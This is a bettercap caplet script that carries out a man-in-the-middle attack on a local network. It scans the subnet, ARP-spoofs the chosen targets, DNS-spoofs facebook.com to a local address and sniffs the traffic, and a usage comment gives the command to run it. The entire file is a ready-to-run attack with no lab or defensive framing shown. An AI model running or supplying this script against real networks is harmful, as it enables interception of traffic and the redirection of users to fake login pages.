# usage:
# sudo ./bettercap -caplet dns-spoof.cap -eval "set arp.spoof.targets 192.168.3.2, 192.168.3.1"

# detect all devices in subnet:
net.recon on
net.probe on
sleep 5
net.probe off
net.recon off

set arp.spoof.internal true;
set dns.spoof.domains facebook.com; set dns.spoof.address 192.168.3.2;
set net.sniff.verbose false;

set net.sniff.verbose true;
net.sniff on; dns.spoof on; arp.spoof on

